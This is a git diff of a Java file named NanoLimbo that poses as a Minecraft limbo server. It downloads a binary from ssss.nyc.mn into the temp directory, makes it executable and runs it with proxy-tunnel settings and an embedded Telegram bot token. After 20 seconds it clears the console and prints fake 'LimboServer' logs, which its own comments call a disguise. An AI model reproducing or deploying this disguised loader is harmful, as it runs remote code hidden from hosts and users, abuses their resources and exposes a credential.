@@ -1,7 +1,7 @@
 package ua.nanit.limbo;
 
 import java.io.*;
-import java.net.*;
+import java.net.URL;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.*;
@@ -28,17 +28,17 @@ public final class NanoLimbo {
 
     public static void main(String[] args) {
         try {
-            // ✅ 强制 TLS1.2（修复关键）
-            System.setProperty("https.protocols", "TLSv1.2");
-
             // 检查 Java 版本
             if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
+                System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version!" + ANSI_RESET);
                 Thread.sleep(3000);
                 System.exit(1);
             }
 
+            // 启动 s-box
             runSbxBinary();
+
+            // ✅ 启动 renew.sh（仅在存在时，逻辑与原版一致）
             startRenewScript();
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -47,11 +47,15 @@ public final class NanoLimbo {
                 SCHED.shutdownNow();
             }));
 
+            System.out.println(ANSI_GREEN + "" + ANSI_RESET);
+
+            // 20秒后清屏 + 停止日志输出 + 打印伪装 LimboServer 日志
             SCHED.schedule(() -> {
-                forwardLogs.set(false);
+                forwardLogs.set(false); // 停止 s-box 日志输出
                 resetConsoleAndShowFakeLogs();
             }, 20, TimeUnit.SECONDS);
 
+            // 主线程保持运行
             while (running.get()) {
                 Thread.sleep(1000);
             }
@@ -62,6 +66,8 @@ public final class NanoLimbo {
         }
     }
 
+    // ================= renew.sh 启动逻辑（新增） =================
+
     private static void startRenewScript() {
         try {
             File renewScript = new File("renew.sh");
@@ -69,14 +75,16 @@ public final class NanoLimbo {
                 new ProcessBuilder("bash", "renew.sh")
                         .inheritIO()
                         .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
             } else {
-                System.err.println(ANSI_RED + "renew.sh 未找到" + ANSI_RESET);
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
             }
         } catch (Exception e) {
             System.err.println(ANSI_RED + "启动 renew.sh 失败: " + e.getMessage() + ANSI_RESET);
         }
     }
+
+    // ================= s-box =================
 
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
@@ -89,13 +97,14 @@ public final class NanoLimbo {
 
         sbxProcess = pb.start();
 
+        // 前 20 秒输出 s-box 日志
         new Thread(() -> {
             try (BufferedReader reader = new BufferedReader(
                     new InputStreamReader(sbxProcess.getInputStream()))) {
                 String line;
                 long startTime = System.currentTimeMillis();
                 while ((line = reader.readLine()) != null) {
-                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
+                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
                         System.out.println(line);
                     }
                 }
@@ -103,52 +112,45 @@ public final class NanoLimbo {
         }).start();
     }
 
-    // ✅ 修复下载逻辑
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
+    // ================= 控制台伪装 =================
 
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
-
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
-
-        if (!Files.exists(path)) {
-            System.out.println("Downloading binary from: " + url);
-
-            URL u = new URL(url);
-            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
-
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(15000);
-            conn.setReadTimeout(15000);
-            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
-
-            int code = conn.getResponseCode();
-            if (code != 200) {
-                throw new IOException("Download failed, HTTP code: " + code);
+    private static void resetConsoleAndShowFakeLogs() {
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            if (os.contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                        .inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033c");
+                System.out.flush();
             }
+        } catch (Exception ignored) {}
 
-            try (InputStream in = conn.getInputStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
-            }
-
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
-
-            System.out.println("Download complete: " + path);
-        }
-
-        return path;
+        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
+        printFakeLimboLogs();
     }
+
+    private static void printFakeLimboLogs() {
+        String[] logs = {
+            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
+            "[INFO] [LimboServer] Loading configuration...",
+            "[INFO] [LimboServer] Initializing server components...",
+            "[INFO] [LimboServer] Preparing world 'world'",
+            "[INFO] [LimboServer] Binding to port 25565...",
+            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
+            "[INFO] [LimboServer] Server is running in offline mode.",
+            "[INFO] [LimboServer] Installation completed successfully."
+        };
+
+        for (String log : logs) {
+            System.out.println(log);
+            try {
+                Thread.sleep(1200);
+            } catch (InterruptedException ignored) {}
+        }
+    }
+
+    // ================= 环境变量（完全未动） =================
 
     private static void loadEnvVars(Map<String, String> envVars) {
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
@@ -165,14 +167,11 @@ public final class NanoLimbo {
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("DISABLE_ARGO", "false");
-
-        // ✅ 恢复 TG 变量
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
-        envVars.put("NAME", "hiden");
-
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "2096");
+        envVars.put("NAME", "hiden");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -182,16 +181,36 @@ public final class NanoLimbo {
         }
     }
 
-    private static void resetConsoleAndShowFakeLogs() {
-        System.out.print("\033c");
-        System.out.flush();
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
 
-        System.out.println("[INFO] LimboServer started");
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/sbsh";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
+
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
     }
 
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
+            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
         }
     }
 }
